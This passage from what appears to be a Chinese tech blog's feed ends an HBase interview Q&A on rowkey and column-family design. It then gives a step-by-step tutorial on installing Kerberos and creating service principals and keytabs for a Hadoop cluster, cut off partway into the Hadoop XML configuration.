[key]获得[key]的第一条记录，因为HBase中rowkey是有序的，第一条记录是最后录入的数据。<ul><li>比如需要保存一个用户的操作记录，按照操作时间倒序排序，在设计rowkey的时候，可以这样设计[userId反转] [Long.Max_Value - timestamp]，在查询用户的所有操作记录数据的时候，直接指定反转后的userId，startRow是[userId反转][000000000000],stopRow是[userId反转][Long.Max_Value - timestamp]</li><li>如果需要查询某段时间的操作记录，startRow是[user反转][Long.Max_Value - 起始时间]，stopRow是[userId反转][Long.Max_Value - 结束时间]</li></ul></li><li><strong>HBase建表预分区</strong>：创建HBase表时，就预先根据可能的RowKey划分出多个region而不是默认的一个，从而可以将后续的读写操作负载均衡到不同的region上，避免热点现象</li></ol><h2 id="5、HBase的-rowkey-设计原则">5、HBase的 rowkey 设计原则</h2><p><strong>长度原则</strong>：100字节以内，8的倍数最好，可能的情况下越短越好。因为HFile是按照 keyvalue 存储的，过长的rowkey会影响存储效率；其次，过长的rowkey在memstore中较大，影响缓冲效果，降低检索效率。最后，操作系统大多为64位，8的倍数，充分利用操作系统的最佳性能。</p><p><strong>散列原则</strong>：高位散列，低位时间字段。避免热点问题。</p><p><strong>唯一原则</strong>：分利用这个排序的特点，将经常读取的数据存储到一块，将最近可能会被访问 的数据放到一块</p><h2 id="6、HBase的列簇设计">6、HBase的列簇设计</h2><p><strong>原则</strong>：在合理范围内能尽量少的减少列簇就尽量减少列簇，因为列簇是共享region的，每个列簇数据相差太大导致查询效率低下。</p><p><strong>最优</strong>：将所有相关性很强的 key-value 都放在同一个列簇下，这样既能做到查询效率最高，也能保持尽可能少的访问不同的磁盘文件。以用户信息为例，可以将必须的基本信息存放在一个列族，而一些附加的额外信息可以放在另一列族</p><h2 id="7、HBase-中-compact-用途是什么，什么时候触发，分为哪两种，有什么区别">7、HBase 中 compact 用途是什么，什么时候触发，分为哪两种，有什么区别</h2><p>在 hbase 中每当有 memstore 数据 flush 到磁盘之后，就形成一个 storefile，当 storeFile的数量达到一定程度后，就需要将 storefile 文件来进行 compaction 操作。Compact 的作用：</p><ol><li>合并文件</li><li>清除过期，多余版本的数据</li><li>提高读写数据的效率 ， HBase 中实现了两种 compaction 的方式：minor and major. 这两种 compaction 方式的 区别是：<ul><li>Minor 操作只用来做部分文件的合并操作以及包括 minVersion=0 并且设置 ttl 的过 期版本清理，不做任何删除数据、多版本数据的清理工作</li><li>Major 操作是对 Region 下的 HStore 下的所有 StoreFile 执行合并操作，最终的结果 是整理合并出一个文件。</li></ul></li></ol>]]></content>
    
    
    <summary type="html">&lt;h1&gt;一、Hadoop大厂面试真题&lt;/h1&gt;
&lt;h3 id=&quot;1、请说下HDFS读写流程&quot;&gt;1、请说下HDFS读写流程&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;HDFS写流程&lt;/strong&gt;：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Client客户端发送上传请求，&lt;strong&gt;通过RPC与NameNode建立通信&lt;/strong&gt;，NameNode检查该用户是否有上传权限，以及上传的文件是否在HDFS对应的目录下重名，如果这两者有任意一个不满足，则直接报错，如果两者都满足，则返回给客户端一个可以上传的信息；&lt;/li&gt;
&lt;li&gt;Client根据文件的大小进行切分，默认128M一块，切分完成之后给NameNode发送请求第一个block块上传到哪些服务器上；&lt;/li&gt;
&lt;li&gt;NameNode收到请求之后，根据网络拓扑和机架感知以及副本机制进行文件分配，返回可用的DataNode的地址；&lt;/li&gt;
&lt;/ol&gt;</summary>
    
    
    
    <category term="大数据" scheme="https://blog.shawncoding.top/categories/%E5%A4%A7%E6%95%B0%E6%8D%AE/"/>
    
    
    <category term="大数据" scheme="https://blog.shawncoding.top/tags/%E5%A4%A7%E6%95%B0%E6%8D%AE/"/>
    
  </entry>
  
  <entry>
    <title>安全认证Kerberos详解</title>
    <link href="https://blog.shawncoding.top/posts/b1b1cf80.html"/>
    <id>https://blog.shawncoding.top/posts/b1b1cf80.html</id>
    <published>2024-05-31T08:22:34.000Z</published>
    <updated>2024-05-31T08:33:20.531Z</updated>
    
    <content type="html"><![CDATA[<h1>一、Kerberos入门与使用</h1><blockquote><p>hadoop官网：<a href="https://hadoop.apache.org/docs/r3.1.3/hadoop-project-dist/hadoop-common/SecureMode.html" target="_blank" rel="noopener" title="https://hadoop.apache.org/docs/r3.1.3/hadoop-project-dist/hadoop-common/SecureMode.html">https://hadoop.apache.org/docs/r3.1.3/hadoop-project-dist/hadoop-common/SecureMode.html</a></p></blockquote><h2 id="1、Kerberos概述">1、Kerberos概述</h2><h3 id="1-1-什么是Kerberos">1.1 什么是Kerberos</h3><p>Kerberos是一种计算机网络认证协议，用来在非安全网络中，对个人通信以安全的手段进行<strong>身份认证</strong>。这个词又指麻省理工学院为这个协议开发的一套计算机软件。软件设计上采用客户端/服务器结构，并且能够进行相互认证，即客户端和服务器端均可对对方进行身份认证。可以用于防止窃听、防止重放攻击、保护数据完整性等场合，是一种应用对称密钥体制进行密钥管理的系统</p><a id="more"></a><h3 id="1-2-Kerberos术语">1.2 Kerberos术语</h3><p>Kerberos中有以下一些概念需要了解：</p><ul><li>KDC（Key Distribute Center）：密钥分发中心，负责存储用户信息，管理发放票据</li><li>Realm：Kerberos所管理的一个领域或范围，称之为一个Realm</li><li>Rrincipal：Kerberos所管理的一个用户或者一个服务，可以理解为Kerberos中保存的一个账号，其格式通常如下：primary**/**instance@realm</li><li>keytab：Kerberos中的用户认证，可通过密码或者密钥文件证明身份，keytab指密钥文件</li></ul><h3 id="1-3-Kerberos认证原理">1.3 Kerberos认证原理</h3><p><img src="http://qnypic.shawncoding.top/blog/202404161644139.png" alt></p><h2 id="2、Kerberos安装">2、Kerberos安装</h2><h3 id="2-1-安装Kerberos相关服务">2.1 安装Kerberos相关服务</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 需要进入root用户</span></span><br><span class="line"><span class="comment"># 选择集群中的一台主机（hadoop102）作为Kerberos服务端，安装KDC，所有主机都需要部署Kerberos客户端</span></span><br><span class="line"><span class="comment"># 服务端主机执行以下安装命令，主机器安装</span></span><br><span class="line">yum install -y krb5-server</span><br><span class="line"></span><br><span class="line"><span class="comment"># 客户端主机执行以下安装命令,三台机器分别安装</span></span><br><span class="line">yum install -y krb5-workstation krb5-libs</span><br></pre></td></tr></table></figure><h3 id="2-2-修改配置文件">2.2 修改配置文件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 服务端主机（hadoop102）</span></span><br><span class="line">vim /var/kerberos/krb5kdc/kdc.conf</span><br><span class="line"><span class="comment"># 修改如下内容,EXAMPLE.COM可以修改成自己的，这里我就暂时不修改了</span></span><br><span class="line">[kdcdefaults]</span><br><span class="line"> kdc_ports = 88</span><br><span class="line"> kdc_tcp_ports = 88</span><br><span class="line"></span><br><span class="line">[realms]</span><br><span class="line"> EXAMPLE.COM = &#123;</span><br><span class="line">  <span class="comment">#master_key_type = aes256-cts</span></span><br><span class="line">  acl_file = /var/kerberos/krb5kdc/kadm5.acl</span><br><span class="line">  dict_file = /usr/share/dict/words</span><br><span class="line">  admin_keytab = /var/kerberos/krb5kdc/kadm5.keytab</span><br><span class="line">  supported_enctypes = aes256-cts:normal aes128-cts:normal des3-hmac-sha1:normal arcfour-hmac:normal camellia256-cts:normal camellia128-cts:normal des-hmac-sha1:normal des-cbc-md5:normal des-cbc-crc:normal</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 客户端主机（所有主机）</span></span><br><span class="line"><span class="comment"># 修改/etc/krb5.conf文件</span></span><br><span class="line">vim /etc/krb5.conf</span><br><span class="line"><span class="comment"># Configuration snippets may be placed in this directory as well</span></span><br><span class="line">includedir /etc/krb5.conf.d/</span><br><span class="line"></span><br><span class="line">[logging]</span><br><span class="line"> default = FILE:/var/<span class="built_in">log</span>/krb5libs.log</span><br><span class="line"> kdc = FILE:/var/<span class="built_in">log</span>/krb5kdc.log</span><br><span class="line"> admin_server = FILE:/var/<span class="built_in">log</span>/kadmind.log</span><br><span class="line"></span><br><span class="line">[libdefaults]</span><br><span class="line"> dns_lookup_realm = <span class="literal">false</span></span><br><span class="line"> dns_lookup_kdc = <span class="literal">false</span></span><br><span class="line"> ticket_lifetime = 24h</span><br><span class="line"> renew_lifetime = 7d</span><br><span class="line"> forwardable = <span class="literal">true</span></span><br><span class="line"> rdns = <span class="literal">false</span></span><br><span class="line"> pkinit_anchors = FILE:/etc/pki/tls/certs/ca-bundle.crt</span><br><span class="line"> default_realm = EXAMPLE.COM</span><br><span class="line"> <span class="comment">#default_ccache_name = KEYRING:persistent:%&#123;uid&#125;</span></span><br><span class="line"></span><br><span class="line">[realms]</span><br><span class="line"> EXAMPLE.COM = &#123;</span><br><span class="line">  kdc = hadoop102</span><br><span class="line">  admin_server = hadoop102</span><br><span class="line"> &#125;</span><br><span class="line">[domain_realm]</span><br><span class="line"><span class="comment"># .example.com = EXAMPLE.COM</span></span><br><span class="line"><span class="comment"># example.com = EXAMPLE.COM</span></span><br></pre></td></tr></table></figure><h3 id="2-3-其他配置与启动">2.3 其他配置与启动</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 初始化KDC数据库</span></span><br><span class="line"><span class="comment"># 在服务端主机（hadoop102）执行以下命令，并根据提示输入密码（123456）</span></span><br><span class="line">kdb5_util create -s</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改管理员权限配置文件</span></span><br><span class="line"><span class="comment"># 在服务端主机（hadoop102）修改/var/kerberos/krb5kdc/kadm5.acl文件</span></span><br><span class="line">*/admin@EXAMPLE.COM     *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动Kerberos相关服务</span></span><br><span class="line"><span class="comment"># 在主节点（hadoop102）启动KDC，并配置开机自启</span></span><br><span class="line">systemctl start krb5kdc</span><br><span class="line">systemctl <span class="built_in">enable</span> krb5kdc</span><br><span class="line"><span class="comment"># 在主节点（hadoop102）启动Kadmin，该服务为KDC数据库访问入口</span></span><br><span class="line">systemctl start kadmin</span><br><span class="line">systemctl <span class="built_in">enable</span> kadmin</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建Kerberos管理员用户</span></span><br><span class="line"><span class="comment"># 在KDC所在主机（hadoop102），执行以下命令，并按照提示输入密码</span></span><br><span class="line">kadmin.local -q <span class="string">"addprinc admin/admin"</span></span><br></pre></td></tr></table></figure><h2 id="3、Kerberos使用概述">3、Kerberos使用概述</h2><h3 id="3-1-Kerberos数据库操作">3.1 Kerberos数据库操作</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 本地登录（无需认证）</span></span><br><span class="line">kadmin.local</span><br><span class="line"><span class="comment"># 远程登录（需进行主体认证，认证操作见下文）</span></span><br><span class="line">kadmin</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建Kerberos主体</span></span><br><span class="line"><span class="comment"># 登录数据库，输入以下命令，并按照提示输入密码</span></span><br><span class="line">addprinc <span class="built_in">test</span></span><br><span class="line"><span class="comment"># 也可通过以下shell命令直接创建主体</span></span><br><span class="line">kadmin.local -q<span class="string">"addprinc test"</span></span><br><span class="line"><span class="comment"># 修改主体密码</span></span><br><span class="line">cpw <span class="built_in">test</span></span><br><span class="line"><span class="comment"># 查看所有主体</span></span><br><span class="line">list_principals</span><br></pre></td></tr></table></figure><h3 id="3-2-Kerberos认证操作">3.2 Kerberos认证操作</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 密码认证</span></span><br><span class="line"><span class="comment"># 使用kinit进行主体认证，并按照提示输入密码</span></span><br><span class="line">kinit <span class="built_in">test</span></span><br><span class="line"><span class="comment"># 查看认证凭证</span></span><br><span class="line">klist</span><br><span class="line"></span><br><span class="line"><span class="comment"># 密钥文件认证</span></span><br><span class="line"><span class="comment"># 生成主体test的keytab文件到指定目录/root/test.keytab</span></span><br><span class="line">kadmin.local -q <span class="string">"xst -norandkey -k  /root/test.keytab test@EXAMPLE.COM"</span></span><br><span class="line"><span class="comment"># 注：-norandkey的作用是声明不随机生成密码，若不加该参数，会导致之前的密码失效</span></span><br><span class="line"><span class="comment"># 使用keytab进行认证</span></span><br><span class="line">kinit -kt /root/test.keytab <span class="built_in">test</span></span><br><span class="line"><span class="comment"># 查看认证凭证</span></span><br><span class="line">klist</span><br><span class="line"></span><br><span class="line"><span class="comment"># 销毁凭证</span></span><br><span class="line">kdestroy</span><br><span class="line">klist</span><br></pre></td></tr></table></figure><p>一些常用操作</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1、密码形式创建kdc用户</span></span><br><span class="line">sudo kadmin.local -q <span class="string">"addprinc -pw <span class="variable">$&#123;pwd&#125;</span> <span class="variable">$&#123;kdcPrinc&#125;</span>"</span> </span><br><span class="line"><span class="comment"># 2、keytab形式创建kdc用户</span></span><br><span class="line">sudo kadmin.local -q <span class="string">"ktadd -norandkey -k <span class="variable">$&#123;kdcPath&#125;</span> <span class="variable">$&#123;kdcPrinc&#125;</span>"</span></span><br><span class="line"><span class="comment"># 3、删除kdc用户</span></span><br><span class="line">sudo kadmin.local -q <span class="string">"delprinc -force <span class="variable">$&#123;kdcPrinc&#125;</span>"</span></span><br><span class="line"><span class="comment"># 4、修改kdc用户密码</span></span><br><span class="line">sudo kadmin.local -q <span class="string">"cpw -pw <span class="variable">$&#123;newpwd&#125;</span> <span class="variable">$&#123;kdcPrinc&#125;</span>"</span></span><br><span class="line"><span class="comment"># 5、销毁票据</span></span><br><span class="line">sudo su <span class="variable">$&#123;linuxUserName&#125;</span> kdestroy</span><br><span class="line"><span class="comment"># 6、认证票据</span></span><br><span class="line">sudo su <span class="variable">$&#123;linuxUserName&#125;</span> kinit</span><br><span class="line"><span class="comment"># 7、查看票据缓存文件目录地址</span></span><br><span class="line">sudo su <span class="variable">$&#123;linuxUserName&#125;</span> klist</span><br><span class="line"><span class="comment"># 8、查找某个目录下是否有该文件</span></span><br><span class="line">find <span class="variable">$&#123;kdcPath&#125;</span> -name <span class="variable">$&#123;keytabFile&#125;</span></span><br></pre></td></tr></table></figure><h1>二、Hadoop Kerberos配置</h1><h2 id="1、创建Hadoop系统用户">1、创建Hadoop系统用户</h2><p>为Hadoop开启Kerberos，需为不同服务准备不同的用户，启动服务时需要使用相应的用户。须在<strong>所有节点</strong>创建以下用户和用户组</p><table><thead><tr><th><strong>User:Group</strong></th><th><strong>Daemons</strong></th></tr></thead><tbody><tr><td><strong>hdfs:hadoop</strong></td><td>NameNode, Secondary NameNode, JournalNode, DataNode</td></tr><tr><td><strong>yarn:hadoop</strong></td><td>ResourceManager, NodeManager</td></tr><tr><td><strong>mapred:hadoop</strong></td><td>MapReduce JobHistory Server</td></tr></tbody></table><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 创建hadoop组，分别在三台机器创建</span></span><br><span class="line">groupadd hadoop</span><br><span class="line"><span class="comment"># 创建各用户并设置密码，分别在三台机器创建</span></span><br><span class="line">useradd hdfs -g hadoop</span><br><span class="line"><span class="built_in">echo</span> hdfs | passwd --stdin  hdfs</span><br><span class="line">useradd yarn -g hadoop</span><br><span class="line"><span class="built_in">echo</span> yarn | passwd --stdin yarn</span><br><span class="line">useradd mapred -g hadoop</span><br><span class="line"><span class="built_in">echo</span> mapred | passwd --stdin mapred</span><br></pre></td></tr></table></figure><h2 id="2、Hadoop-Kerberos配置">2、Hadoop Kerberos配置</h2><h3 id="2-1-为Hadoop各服务创建Kerberos主体（Principal）">2.1 为Hadoop各服务创建Kerberos主体（Principal）</h3><p>主体格式如下：ServiceName/HostName@REALM，例如dn/hadoop102@EXAMPLE.COM</p><table><thead><tr><th><strong>服务</strong></th><th><strong>所在主机</strong></th><th><strong>主体（Principal）</strong></th></tr></thead><tbody><tr><td><strong>NameNode</strong></td><td>hadoop102</td><td>nn/hadoop102</td></tr><tr><td><strong>DataNode</strong></td><td>hadoop102</td><td>dn/hadoop102</td></tr><tr><td><strong>DataNode</strong></td><td>hadoop103</td><td>dn/hadoop103</td></tr><tr><td><strong>DataNode</strong></td><td>hadoop104</td><td>dn/hadoop104</td></tr><tr><td><strong>Secondary NameNode</strong></td><td>hadoop104</td><td>sn/hadoop104</td></tr><tr><td><strong>ResourceManager</strong></td><td>hadoop103</td><td>rm/hadoop103</td></tr><tr><td><strong>NodeManager</strong></td><td>hadoop102</td><td>nm/hadoop102</td></tr><tr><td><strong>NodeManager</strong></td><td>hadoop103</td><td>nm/hadoop103</td></tr><tr><td><strong>N****odeManager</strong></td><td>hadoop104</td><td>nm/hadoop104</td></tr><tr><td><strong>JobHistory Server</strong></td><td>hadoop102</td><td>jhs/hadoop102</td></tr><tr><td><strong>W****eb UI</strong></td><td>hadoop102</td><td>HTTP/hadoop102</td></tr><tr><td><strong>W****eb UI</strong></td><td>hadoop103</td><td>HTTP/hadoop103</td></tr><tr><td><strong>W****eb UI</strong></td><td>hadoop104</td><td>HTTP/hadoop104</td></tr></tbody></table><p>创建主体说明</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 为服务创建的主体，需要通过密钥文件keytab文件进行认证，故需为各服务准备一个安全的路径用来存储keytab文件</span></span><br><span class="line">mkdir /etc/security/keytab/</span><br><span class="line">chown -R root:hadoop /etc/security/keytab/</span><br><span class="line">chmod 770 /etc/security/keytab/</span><br><span class="line"></span><br><span class="line"><span class="comment"># 管理员主体认证</span></span><br><span class="line"><span class="comment"># 为执行创建主体的语句，需登录Kerberos 数据库客户端，登录之前需先使用Kerberos的管理员用户进行认证，执行以下命令并根据提示输入密码</span></span><br><span class="line">kinit admin/admin</span><br><span class="line"><span class="comment"># 登录数据库客户端</span></span><br><span class="line">kadmin</span><br><span class="line"><span class="comment"># 执行创建主体的语句 </span></span><br><span class="line">kadmin:  addprinc -randkey <span class="built_in">test</span>/<span class="built_in">test</span></span><br><span class="line">kadmin:  xst -k /etc/security/keytab/test.keytab <span class="built_in">test</span>/<span class="built_in">test</span></span><br><span class="line"><span class="comment"># ======说明======</span></span><br><span class="line"><span class="comment"># (1)addprinc test/test：作用是新建主体</span></span><br><span class="line"><span class="comment"># addprinc：增加主体</span></span><br><span class="line"><span class="comment"># -randkey：密码随机，因hadoop各服务均通过keytab文件认证，故密码可随机生成</span></span><br><span class="line"><span class="comment"># test/test：新增的主体</span></span><br><span class="line"><span class="comment"># (2)xst -k /etc/security/keytab/test.keytab test/test：作用是将主体的密钥写入keytab文件</span></span><br><span class="line"><span class="comment"># xst：将主体的密钥写入keytab文件</span></span><br><span class="line"><span class="comment"># -k /etc/security/keytab/test.keytab：指明keytab文件路径和文件名</span></span><br><span class="line"><span class="comment"># test/test：主体</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 为方便创建主体，可使用如下命令</span></span><br><span class="line">kadmin -padmin/admin -wadmin -q<span class="string">"addprinc -randkey test/test"</span></span><br><span class="line">kadmin -padmin/admin -wadmin -q<span class="string">"xst -k /etc/security/keytab/test.keytab test/test"</span></span><br><span class="line"><span class="comment"># 说明：</span></span><br><span class="line"><span class="comment"># -p：主体</span></span><br><span class="line"><span class="comment"># -w：密码</span></span><br><span class="line"><span class="comment"># -q：执行语句</span></span><br><span class="line"><span class="comment"># 操作主体的其他命令，可参考官方文档，地址如下：</span></span><br><span class="line"><span class="comment"># http://web.mit.edu/kerberos/krb5-current/doc/admin/admin_commands/kadmin_local.html#commands</span></span><br></pre></td></tr></table></figure><p>开始创建主体</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 在所有节点创建keytab文件目录,三台机器执行</span></span><br><span class="line">mkdir /etc/security/keytab/</span><br><span class="line">chown -R root:hadoop /etc/security/keytab/</span><br><span class="line">chmod 770 /etc/security/keytab/</span><br><span class="line"></span><br><span class="line"><span class="comment"># ==========以下命令在hadoop102节点执行============</span></span><br><span class="line">kadmin -padmin/admin -wadmin -q<span class="string">"addprinc -randkey nn/hadoop102"</span></span><br><span class="line">kadmin -padmin/admin -wadmin -q<span class="string">"xst -k /etc/security/keytab/nn.service.keytab nn/hadoop102"</span></span><br><span class="line">kadmin -padmin/admin -wadmin -q<span class="string">"addprinc -randkey dn/hadoop102"</span></span><br><span class="line">kadmin -padmin/admin -wadmin -q<span class="string">"xst -k /etc/security/keytab/dn.service.keytab dn/hadoop102"</span></span><br><span class="line">kadmin -padmin/admin -wadmin -q<span class="string">"addprinc -randkey nm/hadoop102"</span></span><br><span class="line">kadmin -padmin/admin -wadmin -q<span class="string">"xst -k /etc/security/keytab/nm.service.keytab nm/hadoop102"</span></span><br><span class="line">kadmin -padmin/admin -wadmin -q<span class="string">"addprinc -randkey jhs/hadoop102"</span></span><br><span class="line">kadmin -padmin/admin -wadmin -q<span class="string">"xst -k /etc/security/keytab/jhs.service.keytab jhs/hadoop102"</span></span><br><span class="line">kadmin -padmin/admin -wadmin -q<span class="string">"addprinc -randkey HTTP/hadoop102"</span></span><br><span class="line">kadmin -padmin/admin -wadmin -q<span class="string">"xst -k /etc/security/keytab/spnego.service.keytab HTTP/hadoop102"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ==========以下命令在hadoop103节点执行============</span></span><br><span class="line">kadmin -padmin/admin -wadmin -q<span class="string">"addprinc -randkey rm/hadoop103"</span></span><br><span class="line">kadmin -padmin/admin -wadmin -q<span class="string">"xst -k /etc/security/keytab/rm.service.keytab rm/hadoop103"</span></span><br><span class="line">kadmin -padmin/admin -wadmin -q<span class="string">"addprinc -randkey dn/hadoop103"</span></span><br><span class="line">kadmin -padmin/admin -wadmin -q<span class="string">"xst -k /etc/security/keytab/dn.service.keytab dn/hadoop103"</span></span><br><span class="line">kadmin -padmin/admin -wadmin -q<span class="string">"addprinc -randkey nm/hadoop103"</span></span><br><span class="line">kadmin -padmin/admin -wadmin -q<span class="string">"xst -k /etc/security/keytab/nm.service.keytab nm/hadoop103"</span></span><br><span class="line">kadmin -padmin/admin -wadmin -q<span class="string">"addprinc -randkey HTTP/hadoop103"</span></span><br><span class="line">kadmin -padmin/admin -wadmin -q<span class="string">"xst -k /etc/security/keytab/spnego.service.keytab HTTP/hadoop103"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ==========以下命令在hadoop104节点执行============</span></span><br><span class="line">kadmin -padmin/admin -wadmin -q<span class="string">"addprinc -randkey dn/hadoop104"</span></span><br><span class="line">kadmin -padmin/admin -wadmin -q<span class="string">"xst -k /etc/security/keytab/dn.service.keytab dn/hadoop104"</span></span><br><span class="line">kadmin -padmin/admin -wadmin -q<span class="string">"addprinc -randkey sn/hadoop104"</span></span><br><span class="line">kadmin -padmin/admin -wadmin -q<span class="string">"xst -k /etc/security/keytab/sn.service.keytab sn/hadoop104"</span></span><br><span class="line">kadmin -padmin/admin -wadmin -q<span class="string">"addprinc -randkey nm/hadoop104"</span></span><br><span class="line">kadmin -padmin/admin -wadmin -q<span class="string">"xst -k /etc/security/keytab/nm.service.keytab nm/hadoop104"</span></span><br><span class="line">kadmin -padmin/admin -wadmin -q<span class="string">"addprinc -randkey HTTP/hadoop104"</span></span><br><span class="line">kadmin -padmin/admin -wadmin -q<span class="string">"xst -k /etc/security/keytab/spnego.service.keytab HTTP/hadoop104"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ==========修改所有节点keytab文件的所有者和访问权限============</span></span><br><span class="line"><span class="comment"># 三台机器依次执行</span></span><br><span class="line">chown -R root:hadoop /etc/security/keytab/</span><br><span class="line">chmod 660 /etc/security/keytab/*</span><br></pre></td></tr></table></figure><h3 id="2-2-修改Hadoop配置文件">2.2 修改Hadoop配置文件</h3><p>需要修改的内容如下（添加），修改完毕需要分发所改文件</p><p><code>vim /opt/module/hadoop-3.1.3/etc/hadoop/core-site.xml</code></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- Kerberos主体到系统用户的映射机制 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>hadoop.security.auth_to_local.mechanism<span class="tag">&lt;/<span 